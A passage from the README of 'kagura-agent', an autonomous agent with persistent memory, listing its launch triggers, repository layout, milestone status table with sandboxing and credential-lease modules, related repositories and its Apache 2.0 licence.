- **NOT a memory analyzer.** broadlistening lives in memory-cloud.
- **NOT a domain LLM** (Layer 3 rejected).

The agent's job is **autonomous task execution with persistent memory**,
nothing more, nothing less.

---

## Status and what's next

The v0.1–v0.7 **skeleton is built and tested** — the design above is implemented as
a pure-Python core behind protocol seams. What remains for a production deployment
is wiring those seams to live infrastructure (real Docker on the host, the cloud
STS/Cloudflare provider SDKs, a live Slack/Discord workspace) and proving the full
loop end-to-end on a real task. The earlier "when to start building" triggers now
read as **launch (not build) triggers** — when to stand a real deployment up:

1. The chat-ingestion pipeline in production, accumulating
   non-trivial customer memory.
2. Internal dogfooding signal: the team wants "an agent that remembers past
   failures" while operating memory-cloud itself.
3. Customer ask: at least one Enterprise customer explicitly wants
   "an agent that uses our memory autonomously" (vs just an MCP client).

Unlike the dataset / embeddings workers, this agent's launch is not
tied to a specific quantitative break-even — it's a qualitative
"the value of memory-as-backbone is clear enough to run an actor
that depends on it" call.

---

## Repository layout

The structure the design above maps onto — **as built** (v0.1–v0.7):

```
kagura-agent/
├── README.md                       # this file — canonical design doc + build map
├── docs/
│   ├── operations.md               # incident runbook (hijack / key rotation, cred lifecycle)
│   ├── extending.md                # new API hands (custom MCP / egress / cred + secret backend)
│   ├── legal.md                    # ToS + self-responsibility posture
│   └── architecture.svg            # architecture diagram
├── pyproject.toml                  # extras: claude · brain · slack · discord · aws/gcp/github/cloudflare · keyring
├── src/kagura_agent/
│   ├── core/
│   │   ├── session.py              # orchestration loop — depends on BrainProvider, never a brain SDK directly
│   │   └── brain/
│   │       ├── base.py             # BrainProvider protocol + Task / BrainEvent / BrainCaps
│   │       ├── auth.py             # per-provider auth resolver (subscription | BYOK | key)
│   │       ├── claude.py           # ClaudeBrain — the engine-agnostic wrapper
│   │       ├── sdk_engine.py       # SdkEngine — Claude Agent SDK (default backend)
│   │       ├── kagura_brain_engine.py  # KaguraBrainEngine — kagura-brain (claude/codex/ollama)
│   │       ├── select.py           # KAGURA_AGENT_BRAIN dispatch (sdk | kagura-brain)
│   │       ├── container.py        # ContainerBrainProvider — brain over JSON-lines IPC (#102)
│   │       └── container_main.py   # in-container brain entrypoint
│   ├── mcp/                        # 3-tier MemoryClient (memory is CLI-primary backbone)
│   │   ├── memory_cloud.py         # MemoryClient + LocalMemoryClient (offline SQLite)
│   │   ├── memory_sqlite.py        # SqliteMemoryClient tier
│   │   └── mcp_memory.py           # McpMemoryClient tier (memory-cloud MCP)
│   ├── patterns/
│   │   ├── checkpoint.py           # long-task resume
│   │   ├── continuity.py           # cross-turn continuity / grounding
│   │   ├── failure_learning.py     # remember(prevents) edges
│   │   └── erasure.py              # forget / right-to-erasure
│   ├── membrane/                   # the security boundary (host-side, trusted)
│   │   ├── launcher.py             # per-run {image, creds, mount, egress} → docker run
│   │   ├── runtime.py              # DockerRuntime — the only docker caller
│   │   ├── egress.py · egress_proxy.py   # default-deny allowlist + the single egress proxy
│   │   ├── lease.py                # CredentialBroker / Lease (grants a budget, not a credential)
│   │   ├── providers.py            # cloud cred providers (STS / Cloudflare / static / memory)
│   │   ├── revoke.py               # typed revoke taxonomy — poison vs transient (#131)
│   │   ├── secret_source.py        # secret references (env / OS-keychain *_keyring)
│   │   ├── registry.py · registry_io.py  # provider registry + validator + secret resolution
│   │   ├── granted_broker.py       # default-deny grant gate over the broker
│   │   ├── cloud_transports.py     # build_broker — wire providers to real SDKs
│   │   ├── cred_env.py             # cred → container env mapping
│   │   ├── brain_container.py      # BYOK launch spec for the in-container brain
│   │   ├── graduation.py           # capability trust-score from prevents-edges
│   │   └── seccomp-agent.json      # the agent seccomp profile
│   ├── cockpit/                    # trusted host process (control surface)
│   │   ├── core.py                 # transport-agnostic intent router + serve loop
│   │   ├── intent.py               # structural launch/continue/status/approve/kill classify
│   │   ├── registry.py             # thread ⇄ container session table (+ restart reconcile)
│   │   ├── hitl.py · approval.py   # cred/egress approvals + the pending-approval producer seam
│   │   ├── memory_write.py         # memory:write HITL + write-graduation gate
│   │   └── transports/             # base · cli · slack (Bolt, Socket Mode) · discord
│   └── cli/
│       ├── main.py                 # run / repl / serve / doctor / setup
│       ├── doctor.py               # preflight (memory / claude / docker / egress / providers)
│       └── setup.py                # operator-gated setup guidance
├── tests/                          # 50 modules; test_seam pins the brain-seam invariant
└── deploy/
    ├── images/
    │   ├── Dockerfile.base         # L1: essential + gh, zero creds
    │   ├── Dockerfile.python       # L2: FROM base; +python toolchain
    │   ├── Dockerfile.agent        # the in-container brain image (#102)
    │   └── egress-proxy/           # the egress proxy image
    └── compose.yml                 # single-user self-hosted (cockpit on host)
```

Python; the Claude Agent SDK (default) or the sibling `kagura-brain` claude/codex/ollama wrapper.

### Implementation status (v0.1–v0.7 skeleton)

The pure-Python core of every milestone is implemented and tested (50 test
modules, `mypy --strict`, ≥95% coverage); the infrastructure edges (real Docker,
cloud STS/Cloudflare, the Slack/Discord/SDK clients) sit behind protocol seams with
their adapters wired for deployment.

**Running it.** See the [Quickstart](#quickstart) at the top of this file for the full
first-run setup — install with a brain extra, the two logins (`kagura auth login` +
Claude Code CLI / `ANTHROPIC_API_KEY`), `kagura-agent doctor`, then `kagura-agent run
"task"` (`serve --transport slack|discord` for the cockpit loop, `--container` to seal
the brain in a hardened container). Run the test suite with `pip install -e '.[dev]'`
then `pytest`; type-check with `mypy` (strict).

| Milestone | What landed | Key modules | Tests |
|---|---|---|---|
| **v0.1** walking skeleton | brain seam, `ClaudeBrain`, memory-reachability startup gate (CLI-primary, brain-independent as of v0.2-A6), per-provider auth, CLI transport, structural intent router, session + checkpoint, cockpit wiring | `core/brain/`, `core/session.py`, `cockpit/`, `patterns/checkpoint.py`, `mcp/memory_cloud.py` | `test_session`, `test_brain`, `test_transport`, `test_cockpit_v01`, `test_seam`, `test_memory`, `test_cli` |
| **v0.2** membrane | mount guards (no docker.sock / host FS), baked hardening flags, default-deny egress, `CredentialBroker`/`Lease` (stateless + stateful), lease ledger + sweeper, launcher↔runtime | `membrane/launcher.py`, `membrane/egress.py`, `membrane/lease.py`, `membrane/runtime.py` | `test_membrane`, `test_lease`, `test_launcher` |
| **v0.3** cockpit + HITL | HITL approval (fail-closed + graduation trail), session registry + restart reconcile, status/kill intents | `cockpit/hitl.py`, `cockpit/registry.py`, `cockpit/core.py`, `cockpit/intent.py` | `test_cockpit_v03`, `test_cockpit_control` |
| **v0.4** graduation | per-category curve (verified successes, fail-closed, cooldown), input-trust gate, prevents-edge failure learning | `membrane/graduation.py`, `patterns/failure_learning.py` | `test_graduation`, `test_failure_learning` |
| **v0.5** transports | Slack (Bolt) + Discord normalizers onto the shared `Event` — pure additions, no core change | `cockpit/transports/slack.py`, `cockpit/transports/discord.py` | `test_transports_v05` |
| **v0.6** credential config | secret references (env / OS-keychain `*_keyring`), the provider registry + validator, and `GrantedBroker` — leases are minted only for explicitly `--grant`ed scopes (default-deny) | `membrane/secret_source.py`, `membrane/registry.py`, `membrane/granted_broker.py`, `membrane/cred_env.py` | `test_secret_source`, `test_granted_broker`, `test_registry`, `test_build_broker`, `test_cred_env` |
| **v0.7** run path + doctor | grants **enforced** end-to-end (`run` builds broker → leases → container env → releases on exit), suffix-agnostic secret resolution, `doctor` secret-backend awareness, the `serve` cockpit loop, and the pre-OSS adversarial-audit hardening (lease-sweep poison-vs-transient, typed revoke taxonomy) | `cli/main.py`, `cli/doctor.py`, `membrane/cloud_transports.py`, `membrane/registry_io.py`, `membrane/revoke.py` | `test_doctor`, `test_doctor_credentials`, `test_registry_io`, `test_revoke`, `test_membrane_bugfixes` |
| **#102** brain-in-container | run the brain **inside** the hardened, egress-sealed container over JSON-lines IPC (`ContainerBrainProvider`), with an in-container entrypoint + BYOK launch spec; `serve --container` wires launch → registry → kill | `core/brain/container.py`, `core/brain/container_main.py`, `membrane/brain_container.py` | `test_container_brain`, `test_cockpit_container`, `test_brain_container_deploy` |
| **#134** kagura-brain backend | a second brain behind the same protocol — `KAGURA_AGENT_BRAIN=kagura-brain` → claude/codex, with `…_MODEL` / `…_LOCAL_PROVIDER` / `…_ENDPOINT` reaching local + cloud **ollama** (the BYO-endpoint mis-route was fixed upstream in kagura-brain 0.6.0) | `core/brain/select.py`, `core/brain/kagura_brain_engine.py`, `core/brain/sdk_engine.py` | `test_brain_select`, `test_kagura_brain_engine` |

The seam invariant is enforced as a test: `test_seam` fails if `core/session.py`
ever imports the SDK. `deploy/images/` ships Dockerfile *recipes* (digest-pinned,
no prebuilt image) — `Dockerfile.base` / `Dockerfile.python`, plus
`Dockerfile.agent` for the in-container brain (#102) — and `deploy/compose.yml`
provisions the egress proxy; the cockpit runs on the host and is the only side
that speaks to Docker.

---

## Related repositories

| Repo | Role | Relationship to agent |
|---|---|---|
| [`kagura-ai/kagura-engineer`](https://github.com/kagura-ai/kagura-engineer) | Coding-specialized actor (shipping) | **Independent sibling agent** sharing the memory+actor thesis (not a platform/instance) — see "kagura-agent and kagura-engineer" above. Where shared primitives get proven first. |
| [`kagura-ai/kagura-code-reviewer`](https://github.com/kagura-ai/kagura-code-reviewer) | Review subagent | Ollama-powered code reviewer with a green/yellow/red verdict; launched by kagura-engineer's `review`. A model for the agent's own sub-agent dispatch. |
| [`kagura-ai/memory-cloud`](https://github.com/kagura-ai/memory-cloud) | Persistence + MCP server | **The backbone.** Agent's primary MCP. |
| [`kagura-ai/kagura-memory-python-sdk`](https://github.com/kagura-ai/kagura-memory-python-sdk) | Primitive SDK | Used by the memory MCP client wrapper inside the agent. |

---

## License

[Apache License 2.0](LICENSE) — © 2026 Kagura AI. See [`LICENSE`](LICENSE) for the full
terms and [`NOTICE`](NOTICE) for attribution. (The repository is currently private; the
code is Apache-2.0 licensed ahead of a public release.)
